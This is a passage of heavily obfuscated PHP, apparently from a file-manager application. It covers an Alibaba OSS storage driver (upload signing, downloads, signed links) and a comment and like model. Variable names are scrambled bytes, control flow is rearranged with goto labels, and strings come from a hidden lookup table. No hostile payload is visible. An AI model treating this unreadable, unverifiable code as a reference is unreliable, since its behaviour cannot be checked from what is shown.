$this->trafficLimit($A¼é±™ï»µ[1321]); $CÃÇĞÂÒ†å = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($eØ¿ƒìö‹­), $e÷ŒÒˆÀÖØ); return array($A¼é±™ï»µ[221] => $CÃÇĞÂÒ†å, $A¼é±™ï»µ[175] => $f…Ì™âä¸ . $A¼é±™ï»µ[8] . $this->pathEncode($eØ¿ƒìö‹­), $A¼é±™ï»µ[222] => gmdate($A¼é±™ï»µ[1329]), $A¼é±™ï»µ[93] => $eØ¿ƒìö‹­); } public function multiUploadAuthData($bîâÆ½–µ‘, $AèÃ±Æ³´Î = array()) { goto b—ÏãçÉ™÷; dŠİß…»»: $a•çé¥Š‰ = $bîâÆ½–µ‘; if (isset($AèÃ±Æ³´Î[$C´¢õéÅ[93]])) { $a•çé¥Š‰ = $AèÃ±Æ³´Î[$C´¢õéÅ[93]]; unset($AèÃ±Æ³´Î[$C´¢õéÅ[93]]); } if (isset($AèÃ±Æ³´Î[$C´¢õéÅ[223]])) { $AèÃ±Æ³´Î[$C´¢õéÅ[222]] = $CéÃÀ•àØ; return $this->listUploadParts($a•çé¥Š‰, $AèÃ±Æ³´Î); } goto aËêÆ—¹ÁŸ; F­Æ¼¯ÓÔ±: if (!empty($AèÃ±Æ³´Î[$C´¢õéÅ[1331]])) { $fùÓÑİ³¿á = array_merge(array($fˆÃ¤ï­ºÍ[4]), $AèÃ±Æ³´Î[$C´¢õéÅ[1331]]); sort($fùÓÑİ³¿á); $fˆÃ¤ï­ºÍ[4] = implode($C´¢õéÅ[229], $fùÓÑİ³¿á); } $Bíà†³âÙø = implode($C´¢õéÅ[229], $fˆÃ¤ï­ºÍ); $Cé°Šâ˜áº = base64_encode(hash_hmac($C´¢õéÅ[230], $Bíà†³âÙø, $this->secret, !0)); goto fË–Ë‡ İÍ; b—ÏãçÉ™÷: $C´¢õéÅ =& $_SERVER[Ö‘Øù]; $CéÃÀ•àØ = isset($AèÃ±Æ³´Î[$C´¢õéÅ[222]]) ? $AèÃ±Æ³´Î[$C´¢õéÅ[222]] : gmdate($C´¢õéÅ[1329]); $FÔ³’ë²¢¯ = isset($AèÃ±Æ³´Î[$C´¢õéÅ[168]]) ? $AèÃ±Æ³´Î[$C´¢õéÅ[168]] : $C´¢õéÅ[33]; goto dŠİß…»»; fË–Ë‡ İÍ: $FÜˆæŒçİô = $C´¢õéÅ[1295] . $this->accessKey . $C´¢õéÅ[4] . $Cé°Šâ˜áº; if (strpos($FÔ³’ë²¢¯, $C´¢õéÅ[225]) === 0) { $FÜˆæŒçİô = array($C´¢õéÅ[232] => $FÜˆæŒçİô, $C´¢õéÅ[222] => $CéÃÀ•àØ); if ($AÈç…¸±Û) { $FÜˆæŒçİô = array_merge($FÜˆæŒçİô, $AÈç…¸±Û); } } return $FÜˆæŒçİô; goto eÛğ¡„óâ‘; aËêÆ—¹ÁŸ: $fˆÃ¤ï­ºÍ = array($C´¢õéÅ[224], $C´¢õéÅ[33], $C´¢õéÅ[119], $CéÃÀ•àØ, "\170\55\x6f\163\x73\55\x64\x61\x74\145\72{$CéÃÀ•àØ}", $C´¢õéÅ[8] . $this->bucket . $C´¢õéÅ[8] . $a•çé¥Š‰ . $FÔ³’ë²¢¯); if (strpos($FÔ³’ë²¢¯, $C´¢õéÅ[225]) === 0) { $fˆÃ¤ï­ºÍ[0] = $C´¢õéÅ[226]; if ($AÈç…¸±Û = $this->trafficLimit($C´¢õéÅ[1321])) { $a•çé¥Š‰ = $C´¢õéÅ[1330]; array_splice($fˆÃ¤ï­ºÍ, 5, 0, $a•çé¥Š‰ . $C´¢õéÅ[4] . $AÈç…¸±Û[$a•çé¥Š‰]); } } if (isset($AèÃ±Æ³´Î[$C´¢õéÅ[227]]) && $AèÃ±Æ³´Î[$C´¢õéÅ[227]] == $C´¢õéÅ[228]) { $fˆÃ¤ï­ºÍ[0] = $C´¢õéÅ[228]; } goto F­Æ¼¯ÓÔ±; eÛğ¡„óâ‘: } public function listUploadParts($f³®ˆ÷Óóç, $a©—Ùƒ¼õ) { goto A–«˜ƒˆ; bÙµâŸŒã•: return array($Fó£ÙùÅ¿è[232] => $A«±š¤‡à, $Fó£ÙùÅ¿è[222] => $a©—Ùƒ¼õ[$Fó£ÙùÅ¿è[222]], $Fó£ÙùÅ¿è[234] => $c…ÂóÉ´ï¸); goto BËåøâ‘Æ£; bÒï¸íº¤: unset($a©—Ùƒ¼õ[$Fó£ÙùÅ¿è[223]], $a©—Ùƒ¼õ[$Fó£ÙùÅ¿è[227]]); $A«±š¤‡à = $this->multiUploadAuthData($f³®ˆ÷Óóç, $a©—Ùƒ¼õ); if (empty($A«±š¤‡à)) { return !1; } goto bÙµâŸŒã•; eĞÆƒ†ÔÈ³: $c¸Ò‹Ó­Œ = $d…‘šç„—‹->getListPart(); $c…ÂóÉ´ï¸ = array(); foreach ($c¸Ò‹Ó­Œ as $E‹ ëÎÄœ) { $c…ÂóÉ´ï¸[] = array($Fó£ÙùÅ¿è[1315] => $E‹ ëÎÄœ->getPartNumber(), $Fó£ÙùÅ¿è[1316] => trim($E‹ ëÎÄœ->getETag(), $Fó£ÙùÅ¿è[116])); } goto bÒï¸íº¤; A–«˜ƒˆ: $Fó£ÙùÅ¿è =& $_SERVER[Ö‘Øù]; $F©Ê¥›àì‹ = parse_url_query($a©—Ùƒ¼õ[$Fó£ÙùÅ¿è[168]]); $d…‘šç„—‹ = $this->client->listParts($this->bucket, $this->pathEncode($f³®ˆ÷Óóç), $F©Ê¥›àì‹[$Fó£ÙùÅ¿è[221]]); goto eĞÆƒ†ÔÈ³; BËåøâ‘Æ£: } public function download($F«ÓÒå¯çñ, $bÎäÅÛ³´‚) { if ($this->isFolder($F«ÓÒå¯çñ)) { return !1; } try { $Eæ÷×Ñ†ª = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $bÎäÅÛ³´‚); $Eæ÷×Ñ†ª = $this->trafficLimit($_SERVER[Ö‘Øù][109], $Eæ÷×Ñ†ª); $this->client->getObject($this->bucket, $this->pathEncode($F«ÓÒå¯çñ), $Eæ÷×Ñ†ª); } catch (OSS\Core\OssException $f•Ëßê‚Üö) { return !1; } return $bÎäÅÛ³´‚; } public function fileSubstr($dÂ³”çŠó, $f¥ÆöëÖ‡ì = 0, $EõåÜ¡•Š‰ = false) { if ($f¥ÆöëÖ‡ì === -1) { $e’Œó•êí = array(); } else { if ($EõåÜ¡•Š‰ === !1) { $b¸¾ÌÙï›» = $this->size($dÂ³”çŠó); } else { $b¸¾ÌÙï›» = $f¥ÆöëÖ‡ì + $EõåÜ¡•Š‰ - 1; } $e’Œó•êí = array(OSS\OssClient::OSS_RANGE => "{$f¥ÆöëÖ‡ì}\55{$b¸¾ÌÙï›»}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($dÂ³”çŠó), $e’Œó•êí); } catch (OSS\Core\OssException $b¯‚éßŠÁÛ) { think_exception($b¯‚éßŠÁÛ->getMessage()); return !1; } } private function trafficLimit($dî×ïÔ´£, $F†ãæõ„Õß = array()) { goto Eãœ³µÀÓ; f£ø´§¢œ‰: if (!$CƒÊ³Øš¯Ã) { return $F†ãæõ„Õß; } $CƒÊ³Øš¯Ã = $CƒÊ³Øš¯Ã < 819200 ? 819200 : ($CƒÊ³Øš¯Ã > 838860800 ? 838860800 : $CƒÊ³Øš¯Ã); $F†ãæõ„Õß[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($CƒÊ³Øš¯Ã); goto Cáê‚£²¢Ñ; Eãœ³µÀÓ: $cĞª¢µÀò½ =& $_SERVER[Ö‘Øù]; if ($dî×ïÔ´£ == $cĞª¢µÀò½[1321] && $this->isUploadServer() || $dî×ïÔ´£ == $cĞª¢µÀò½[109] && $this->isFileOutServer()) { return $F†ãæõ„Õß; } $CƒÊ³Øš¯Ã = floatval($GLOBALS[$cĞª¢µÀò½[6]][$cĞª¢µÀò½[88]][$cĞª¢µÀò½[107]][$dî×ïÔ´£]) * 1024 * 1024 * 8; goto f£ø´§¢œ‰; Cáê‚£²¢Ñ: return $F†ãæõ„Õß; goto EÅğ«ßÄé·; EÅğ«ßÄé·: } public function link($fÑ‚õå×¿ï, $b™• ñˆÍ = array()) { $D”œ«°¤ô =& $_SERVER[Ö‘Øù]; if (!$this->exist($fÑ‚õå×¿ï) || $this->isFolder($fÑ‚õå×¿ï)) { return !1; } try { $b™• ñˆÍ = $this->trafficLimit($D”œ«°¤ô[109], $b™• ñˆÍ); $FêŒÈˆÛÚè = $this->client->signUrl($this->bucket, $this->pathEncode($fÑ‚õå×¿ï), 3600 * 12, $D”œ«°¤ô[228], $b™• ñˆÍ); return $this->getCdnLink($FêŒÈˆÛÚè); } catch (OSS\Core\OssException $eäù£Ñãô) { return !1; } } public function fileOut($a³ÈÆæ³Ì, $aàï“£³ç = false, $Câ¸¾ÄÄä‡ = false, $a—ö­Ô¶¢« = '') { goto A¸¹»òà ; Dê‚‡¹ÓÙ¿: $CàÀ“ŸæÏÍ = $this->link($a³ÈÆæ³Ì, $Eì¼‰ŒíŒô); $this->fileOutLink($CàÀ“ŸæÏÍ); goto Cí…·ÊöË; A¸¹»òà : $c™ãÂÍ†ß =& $_SERVER[Ö‘Øù]; if ($this->isFileOutServer()) { return $this->fileOutServer($a³ÈÆæ³Ì, $aàï“£³ç, $Câ¸¾ÄÄä‡, $a—ö­Ô¶¢«); } if (!$Câ¸¾ÄÄä‡) { $Câ¸¾ÄÄä‡ = $this->pathThis($a³ÈÆæ³Ì); } goto dšø İœ‰İ; AÁÆ•‘¬äí: $aàï“£³ç = $aàï“£³ç ? $c™ãÂÍ†ß[214] : $c™ãÂÍ†ß[215]; $Eì¼‰ŒíŒô = array(OSS\OssClient::OSS_SUB_RESOURCE => $c™ãÂÍ†ß[1332] . rawurlencode("{$aàï“£³ç}\73\146\x69\x6c\145\x6e\x61\x6d\x65\75{$Câ¸¾ÄÄä‡}")); $Eì¼‰ŒíŒô[OSS\OssClient::OSS_SUB_RESOURCE] .= $c™ãÂÍ†ß[1333] . rawurlencode($F¨ÃÊå¦÷Ç); goto Dê‚‡¹ÓÙ¿; dšø İœ‰İ: $Câ¸¾ÄÄä‡ = rawurlencode($Câ¸¾ÄÄä‡); $F¨ÃÊå¦÷Ç = get_file_mime(get_path_ext($Câ¸¾ÄÄä‡)); if ($F¨ÃÊå¦÷Ç == $c™ãÂÍ†ß[213]) { return parent::fileOut($a³ÈÆæ³Ì, $aàï“£³ç, $Câ¸¾ÄÄä‡, $a—ö­Ô¶¢«); } goto AÁÆ•‘¬äí; Cí…·ÊöË: } public function fileOutServer($CÀñË¦Æ±“, $e‚ŸâŸÅµ… = false, $b«ã£ÄÅ¬ = false, $AÒİÄ‡é¼Â = '') { parent::fileOut($CÀñË¦Æ±“, $e‚ŸâŸÅµ…, $b«ã£ÄÅ¬, $AÒİÄ‡é¼Â); } public function fileOutImage($fô°ÑÛäÈ, $B¼ÍæÙ¡„ = 250) { $DÁŞ°ë Ô = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ö‘Øù][1334] . $B¼ÍæÙ¡„); $DÓğøã™² = $this->link($fô°ÑÛäÈ, $DÁŞ°ë Ô); $this->fileOutLink($DÓğøã™²); } public function fileOutImageServer($a—Òô»çÀ, $bèİš‘Û¿é = 250) { parent::fileOutImage($a—Òô»çÀ, $bèİš‘Û¿é); } public function fileOutLink($E¼Éƒ§›ÑŠ) { $añ½®¼Œã¹ =& $_SERVER[Ö‘Øù]; if (!$this->isCdnHost() && substr($E¼Éƒ§›ÑŠ, 0, 7) == $añ½®¼Œã¹[1238]) { $E¼Éƒ§›ÑŠ = $añ½®¼Œã¹[1239] . substr($E¼Éƒ§›ÑŠ, 7); } header($añ½®¼Œã¹[159] . $E¼Éƒ§›ÑŠ); die; } public function hashMd5($Cß»ŒÔÔ, $c”ÙÚ‰ŒïÎ = '') { $eª‹…¤¡ö´ =& $_SERVER[Ö‘Øù]; $a·©ä‰¥Õê = $this->_objectMeta($Cß»ŒÔÔ); if (!$a·©ä‰¥Õê) { return $eª‹…¤¡ö´[33]; } if (!isset($a·©ä‰¥Õê[$eª‹…¤¡ö´[1311]]) && !empty($c”ÙÚ‰ŒïÎ)) { $b¾¥‹˜òÑ = $this->updateObjMeta($Cß»ŒÔÔ, array($eª‹…¤¡ö´[1311] => $c”ÙÚ‰ŒïÎ)); $a·©ä‰¥Õê[$eª‹…¤¡ö´[1311]] = $b¾¥‹˜òÑ ? $c”ÙÚ‰ŒïÎ : $eª‹…¤¡ö´[33]; } return isset($a·©ä‰¥Õê[$eª‹…¤¡ö´[1311]]) ? strtolower($a·©ä‰¥Õê[$eª‹…¤¡ö´[1311]]) : $eª‹…¤¡ö´[33]; } public function size($cƒî§„Ôóä) { $DÎÇ¥Š…®ñ = $this->objectMeta($cƒî§„Ôóä); return $DÎÇ¥Š…®ñ ? $DÎÇ¥Š…®ñ[$_SERVER[Ö‘Øù][78]] : 0; } public function info($FŠ­ª„Íæ) { if ($this->isFolder($FŠ­ª„Íæ)) { return $this->folderInfo($FŠ­ª„Íæ); } else { if ($this->isFile($FŠ­ª„Íæ)) { return $this->fileInfo($FŠ­ª„Íæ); } } return !1; } public function exist($eƒ©ù÷ƒ„Î) { return $this->isFile($eƒ©ù÷ƒ„Î) || $this->isFolder($eƒ©ù÷ƒ„Î); } public function isFile($A‡Ç¶éÒö) { return !$this->isFolder($A‡Ç¶éÒö) && $this->objectMeta($A‡Ç¶éÒö); } public function isFolder($c¿ŠÍë¹£) { return $this->cacheMethod($_SERVER[Ö‘Øù][199], $c¿ŠÍë¹£); } protected function objectMeta($F®ùÖè©à›) { return $this->cacheMethod($_SERVER[Ö‘Øù][200], $F®ùÖè©à›); } protected function _objectMeta($CÚË·ÎÅ›) { $DãŠğ—™©ö =& $_SERVER[Ö‘Øù]; try { $Eºé®Şå–µ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($CÚË·ÎÅ›)); } catch (OSS\Core\OssException $bÍê®„¢é¤) { $Eºé®Şå–µ = !1; } if ($Eºé®Şå–µ) { $Eºé®Şå–µ[$DãŠğ—™©ö[78]] = intval($Eºé®Şå–µ[$DãŠğ—™©ö[1309]]); } return $Eºé®Şå–µ; } protected function _isFolder($AÃ‘ŒÛğ§) { $b‰¼‹â‹Šõ =& $_SERVER[Ö‘Øù]; if ($AÃ‘ŒÛğ§ == $b‰¼‹â‹Šõ[33] || $AÃ‘ŒÛğ§ == $b‰¼‹â‹Šõ[8]) { return !0; } $aÑÍİèİ = array($b‰¼‹â‹Šõ[1305] => $b‰¼‹â‹Šõ[8], $b‰¼‹â‹Šõ[1306] => rtrim($AÃ‘ŒÛğ§, $b‰¼‹â‹Šõ[8]) . $b‰¼‹â‹Šõ[8], $b‰¼‹â‹Šõ[1307] => 1, $b‰¼‹â‹Šõ[1308] => $b‰¼‹â‹Šõ[33]); $dË³ë¼é¶˜ = $this->client->listObjects($this->bucket, $aÑÍİèİ); if ($dË³ë¼é¶˜->getObjectList() || $dË³ë¼é¶˜->getPrefixList()) { return !0; } return !1; } } goto E¹…äçÌî’; B‹¸—ïËŞ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\x6e\164"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\141\155\145" => "\x63\157\155\x6d\x65\x6e\x74\x5f\x6d\145\164\x61", "\x6d\145\x74\x61\x46\x69\x65\x6c\144" => "\143\157\155\x6d\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($d×ƒÕ¿‹) { $dêˆãÙ¨³ˆ =& $_SERVER[Ö‘Øù]; if ($d×ƒÕ¿‹[$dêˆãÙ¨³ˆ[1758]]) { $a¶—óËØÎ = $this->where(array($dêˆãÙ¨³ˆ[1759] => $d×ƒÕ¿‹[$dêˆãÙ¨³ˆ[1758]]))->find(); if (!$a¶—óËØÎ || $a¶—óËØÎ[$dêˆãÙ¨³ˆ[406]] != $d×ƒÕ¿‹[$dêˆãÙ¨³ˆ[406]] || $a¶—óËØÎ[$dêˆãÙ¨³ˆ[499]] != $d×ƒÕ¿‹[$dêˆãÙ¨³ˆ[499]]) { return !1; } $this->where(array($dêˆãÙ¨³ˆ[1759] => $d×ƒÕ¿‹[$dêˆãÙ¨³ˆ[1758]]))->setAdd($dêˆãÙ¨³ˆ[1760], 1); } $d×ƒÕ¿‹[$dêˆãÙ¨³ˆ[1761]] = 0; $d×ƒÕ¿‹[$dêˆãÙ¨³ˆ[1760]] = 0; $d×ƒÕ¿‹[$dêˆãÙ¨³ˆ[743]] = 1; return $this->add($d×ƒÕ¿‹); } public function commentCount($c‡¼§Š‚, $e·õàš£Ïö, $bŸäèò«ò£ = false) { goto b³”¿—•Ş; b³”¿—•Ş: $cíã¸ª¥š =& $_SERVER[Ö‘Øù]; if (!$c‡¼§Š‚) { return array(); } if (is_string($c‡¼§Š‚) || is_int($c‡¼§Š‚)) { $c‡¼§Š‚ = array($c‡¼§Š‚); } goto cºîƒ˜Áğ®; cºîƒ˜Áğ®: $bì¢ôÛâè = array($cíã¸ª¥š[499], $cíã¸ª¥š[1762] => $cíã¸ª¥š[495]); $Cíˆ Š¼… = array($cíã¸ª¥š[499] => array($cíã¸ª¥š[7], $c‡¼§Š‚), $cíã¸ª¥š[406] => $e·õàš£Ïö); if ($bŸäèò«ò£) { $Cíˆ Š¼…[$cíã¸ª¥š[1561]] = $bŸäèò«ò£; } goto F•Œ¼ö‹“; F•Œ¼ö‹“: $DŒ«İ¶õëŒ = $this->field($bì¢ôÛâè)->where($Cíˆ Š¼…)->group($cíã¸ª¥š[499])->select(); return array_to_keyvalue($DŒ«İ¶õëŒ, $cíã¸ª¥š[499], $cíã¸ª¥š[495]); goto e‰‘ª’´„¬; e‰‘ª’´„¬: } public function starTarget($c‘‡ëó‡ğ, $f×Ä©ß³») { goto f °ºïÌÓ¿; f °ºïÌÓ¿: $B§„¹‚è´ =& $_SERVER[Ö‘Øù]; $CŒÒ„¯¤İë = $c‘‡ëó‡ğ + self::TYPE_STAR_OFFSET; $açŒÍğ“Í = array($B§„¹‚è´[1561] => USER_ID, $B§„¹‚è´[406] => $CŒÒ„¯¤İë, $B§„¹‚è´[499] => $f×Ä©ß³»); goto eŒèŸò§óè; c»ÎĞìÆ©: return $this->add($dº„‡øòÅ»); goto DÊë‡ÎÕÊ; eŒèŸò§óè: $f¿ÔÇíÇ¿í = $this->where($açŒÍğ“Í)->find(); if ($f¿ÔÇíÇ¿í) { return $this->where(array($B§„¹‚è´[395] => $f¿ÔÇíÇ¿í[$B§„¹‚è´[395]]))->delete(); } $dº„‡øòÅ» = array($B§„¹‚è´[1758] => 0, $B§„¹‚è´[1561] => USER_ID, $B§„¹‚è´[743] => 1, $B§„¹‚è´[748] => $B§„¹‚è´[33], $B§„¹‚è´[406] => $CŒÒ„¯¤İë, $B§„¹‚è´[499] => $f×Ä©ß³», $B§„¹‚è´[1761] => 0, $B§„¹‚è´[1760] => 0); goto c»ÎĞìÆ©; DÊë‡ÎÕÊ: } public function starTargetCount($fà °ª¢ÒÉ, $Bµ•Ö¤ñŞ) { $D™÷··ËÚÉ =& $_SERVER[Ö‘Øù]; $f¡³…ƒíÕ = $Bµ•Ö¤ñŞ + self::TYPE_STAR_OFFSET; $fß‹ˆ†»«¨ = $this->commentCount($fà °ª¢ÒÉ, $f¡³…ƒíÕ); $CĞ¯‚§×‹ø = $this->commentCount($fà °ª¢ÒÉ, $f¡³…ƒíÕ, USER_ID); return array($D™÷··ËÚÉ[1763] => $fß‹ˆ†»«¨, $D™÷··ËÚÉ[1764] => $CĞ¯‚§×‹ø); } public function starTargetUserList($c´’ÄìÊ©ó, $b‚ÖÑ”È) { goto b•½ã¯¥‚Õ; b•½ã¯¥‚Õ: $CÆãÁÍ½æ„ =& $_SERVER[Ö‘Øù]; $bŠšã¯ÉÈ˜ = $c´’ÄìÊ©ó + self::TYPE_STAR_OFFSET; $DˆŸ·¾ï„ = array($CÆãÁÍ½æ„[499] => $b‚ÖÑ”È, $CÆãÁÍ½æ„[406] => $bŠšã¯ÉÈ˜); goto bÇºä ÇÆ; B¶¨³¾ÃÙÔ: $f“êÁ ùªÍ = $this->field($CÆãÁÍ½æ„[1561])->where($DˆŸ·¾ï„)->limit(500)->select(); $f“êÁ ùªÍ = array_to_keyvalue($f“êÁ ùªÍ, $CÆãÁÍ½æ„[33], $CÆãÁÍ½æ„[1561]); $dµğâÀÑ¤[$CÆãÁÍ½æ„[1765]] = Model($CÆãÁÍ½æ„[508])->userListInfo($f“êÁ ùªÍ); goto a‹Åôƒå¦¢; a‹Åôƒå¦¢: return $dµğâÀÑ¤; goto A–è›­è; bÇºä ÇÆ: $B­ŒçÆ»ãá = $this->where($DˆŸ·¾ï„)->count(); $dµğâÀÑ¤ = array($CÆãÁÍ½æ„[253] => $B­ŒçÆ»ãá, $CÆãÁÍ½æ„[1765] => array()); if (!$B­ŒçÆ»ãá) { return $dµğâÀÑ¤; } goto B¶¨³¾ÃÙÔ; A–è›­è: } public function prasiseUserList($a‘ªè³†²¤) { goto B…ÜÒÙğÙá; CäÃî¤ô²Ë: return $Eæ¢ŠÏïºÏ; goto Cèñ¦Íáµ«; fƒ……§ğÁÊ: $F©äí´Œ²á = Model($E„‡Ÿ¨¯©˜[1767])->field($E„‡Ÿ¨¯©˜[1561])->where($FŞ¬¦É)->limit(500)->select(); $F©äí´Œ²á = array_to_keyvalue($F©äí´Œ²á, $E„‡Ÿ¨¯©˜[33], $E„‡Ÿ¨¯©˜[1561]); $Eæ¢ŠÏïºÏ[$E„‡Ÿ¨¯©˜[1765]] = Model($E„‡Ÿ¨¯©˜[508])->userListInfo($F©äí´Œ²á); goto CäÃî¤ô²Ë; B…ÜÒÙğÙá: $E„‡Ÿ¨¯©˜ =& $_SERVER[Ö‘Øù]; $FŞ¬¦É = array($E„‡Ÿ¨¯©˜[1766] => $a‘ªè³†²¤); $FÃ‰½òç·‡ = $this->where($FŞ¬¦É)->find(); goto AÄâíˆ¦Ù³; AÄâíˆ¦Ù³: $Fù†’ÜÈ = _get($FÃ‰½òç·‡, $E„‡Ÿ¨¯©˜[1761], 0); $Eæ¢ŠÏïºÏ = array($E„‡Ÿ¨¯©˜[253] => $Fù†’ÜÈ, $E„‡Ÿ¨¯©˜[1765] => array()); if (!$Fù†’ÜÈ) { return $Eæ¢ŠÏïºÏ; } goto fƒ……§ğÁÊ; Cèñ¦Íáµ«: } public function remove($EÏÓŞñŒ®ä) { $B® ù¯ÒÌÉ =& $_SERVER[Ö‘Øù]; $b‰É½„É¾˜ = array($B® ù¯ÒÌÉ[1759] => $EÏÓŞñŒ®ä); $dÈ–Ç×Ò = $this->where($b‰É½„É¾˜)->find(); if ($dÈ–Ç×Ò[$B® ù¯ÒÌÉ[1758]]) { $this->where(array($B® ù¯ÒÌÉ[1759] => $dÈ–Ç×Ò[$B® ù¯ÒÌÉ[1758]]))->setAdd($B® ù¯ÒÌÉ[1760], -1); } return $this->where($b‰É½„É¾˜)->delete(); } public function edit($C¸á˜œŸàö, $cÃØË¡÷Œ) { $aòÂŒğê¦Î =& $_SERVER[Ö‘Øù]; $fİÌ„ ‡ß = array($aòÂŒğê¦Î[1759] => $C¸á˜œŸàö); return $this->where($fİÌ„ ‡ß)->save(array($aòÂŒğê¦Î[1768] => $cÃØË¡÷Œ)); } public function prasise($dïØ²‡Š÷ç) { $B‹¾¦‡Ú·Í =& $_SERVER[Ö‘Øù]; $A¸Ğ³Ş•­Ö = Model($B‹¾¦‡Ú·Í[1769]); $D«âôÕÀ Æ = array($B‹¾¦‡Ú·Í[1759] => $dïØ²‡Š÷ç, $B‹¾¦‡Ú·Í[1552] => USER_ID); $eØª®ğˆ»” = $A¸Ğ³Ş•­Ö->where($D«âôÕÀ Æ)->find(); if (!$eØª®ğˆ»”) { $A¸Ğ³Ş•­Ö->add($D«âôÕÀ Æ); $Fİ‹Ë¥Ÿ—Ë = $this->where(array($B‹¾¦‡Ú·Í[1759] => $dïØ²‡Š÷ç))->setAdd($B‹¾¦‡Ú·Í[1761], 1); } else { $A¸Ğ³Ş•­Ö->where($D«âôÕÀ Æ)->delete(); $Fİ‹Ë¥Ÿ—Ë = $this->where(array($B‹¾¦‡Ú·Í[1759] => $dïØ²‡Š÷ç))->setAdd($B‹¾¦‡Ú·Í[1761], -1); } return $Fİ‹Ë¥Ÿ—Ë; } public function targetInfo($Añ¦—ÛÂ‡‘, $F½××Êª ) { goto D©‘´œµö¨; f˜çñ†¢®: $Aª…æ—ƒ‡Ò = "\x52\111\107\x48\124\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\143\157\x6d\x6d\x65\x6e\x74\x5f\160\x72\141\x69\163\145\40\x73\164\x61\162\x20\x6f\156\x20\x63\x6f\155\155\145\156\164\x2e\x63\x6f\x6d\155\x65\x6e\x74\x49\x44\40\x3d\x20\x73\164\x61\x72\56\143\x6f\155\x6d\145\x6e\164\x49\x44"; $cÄ­ä›Ä•· = $this->alias($c‹´óÙ÷“[352])->where($b†¤â‘Åœ£)->join($Aª…æ—ƒ‡Ò, $c‹´óÙ÷“[1770])->count(); $DÔŞã¡‰œ¼ = array($c‹´óÙ÷“[1771] => $C†’ãÖ’, $c‹´óÙ÷“[1772] => $cÄ­ä›Ä•·); goto DÏ‘çöÀ; DÏ‘çöÀ: return $DÔŞã¡‰œ¼; goto f‰ª”ÃŒËÓ; D©‘´œµö¨: $c‹´óÙ÷“ =& $_SERVER[Ö‘Øù]; $b†¤â‘Åœ£ = array($c‹´óÙ÷“[575] => $Añ¦—ÛÂ‡‘, $c‹´óÙ÷“[576] => $F½××Êª ); $C†’ãÖ’ = $this->where($b†¤â‘Åœ£)->count(); goto f˜çñ†¢®; f‰ª”ÃŒËÓ: } public function listData($bòƒ»Ú° ¸) { $b÷·šŸÓºÏ =& $_SERVER[Ö‘Øù]; if (isset($bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1773]])) { if ($bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1773]]) { $bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1766]] = array($b÷·šŸÓºÏ[1007], intval($bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1773]])); } unset($bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1773]]); } if (isset($bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1774]])) { if ($bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1774]]) { $bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1766]] = array($b÷·šŸÓºÏ[1004], intval($bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1774]])); } unset($bòƒ»Ú° ¸[$b÷·šŸÓºÏ[1774]]); } return $this->_listData($bòƒ»Ú° ¸); } private function _listData($c»ÛˆåÔ) { $Càæ½Œò¢Ğ =& $_SERVER[Ö‘Øù]; $AÃ¹·÷…‰Ù = $this->where($c»ÛˆåÔ)->_makeOrder()->selectPage(100); $this->_listAppendParent($AÃ¹·÷…‰Ù[$Càæ½Œò¢Ğ[367]]); $this->_listAppendUser($AÃ¹·÷…‰Ù[$Càæ½Œò¢Ğ[367]]); $this->_listAppendMeta($AÃ¹·÷…‰Ù[$Càæ½Œò¢Ğ[367]]); return $AÃ¹·÷…‰Ù; } private function _makeOrder() { $CÑ‹ßïæ°í =& $_SERVER[Ö‘Øù]; $E¨İˆé‰µ = array($CÑ‹ßïæ°í[1761], $CÑ‹ßïæ°í[1760], $CÑ‹ßïæ°í[194]); $BÖÛùç–Œ¶ = Input::get($CÑ‹ßïæ°í[450], $CÑ‹ßïæ°í[7], $CÑ‹ßïæ°í[418], $E¨İˆé‰µ); $dß¿òÖÅÛÑ = Input::get($CÑ‹ßïæ°í[451], $CÑ‹ßïæ°í[7], $CÑ‹ßïæ°í[1554], array($CÑ‹ßïæ°í[1775], $CÑ‹ßïæ°í[446])); $Fåˆ•Í˜Íé = $BÖÛùç–Œ¶ . $CÑ‹ßïæ°í[50] . $dß¿òÖÅÛÑ; return $this->order($Fåˆ•Í˜Íé); } private function _listAppendParent(&$Aê˜¯²…¤) { goto Dâ×¤í“¥¶; Dâ×¤í“¥¶: $CŸÛ–•ˆšÓ =& $_SERVER[Ö‘Øù]; $bíé•ù‰¬ = array_unique(array_to_keyvalue($Aê˜¯²…¤, $CŸÛ–•ˆšÓ[33], $CŸÛ–•ˆšÓ[1758])); $bíé•ù‰¬ = array_remove_value($bíé•ù‰¬, $CŸÛ–•ˆšÓ[191]); goto fæ¯åÃ; fæ¯åÃ: if (!$bíé•ù‰¬) { return; } $AÑÛ‚ÖÉÇ¥ = $this->where(array($CŸÛ–•ˆšÓ[1759] => array($CŸÛ–•ˆšÓ[7], $bíé•ù‰¬)))->select(); $AÑÛ‚ÖÉÇ¥ = array_to_keyvalue($AÑÛ‚ÖÉÇ¥, $CŸÛ–•ˆšÓ[1766]); goto eëõëÃ®; eëõëÃ®: foreach ($Aê˜¯²…¤ as &$d††İ•ŠÓ) { if (isset($AÑÛ‚ÖÉÇ¥[$d††İ•ŠÓ[$CŸÛ–•ˆšÓ[1758]]])) { $d††İ•ŠÓ[$CŸÛ–•ˆšÓ[1776]] = $AÑÛ‚ÖÉÇ¥[$d††İ•ŠÓ[$CŸÛ–•ˆšÓ[1758]]]; } } unset($d††İ•ŠÓ); goto B†ïğ®ªÆ; B†ïğ®ªÆ: } private function 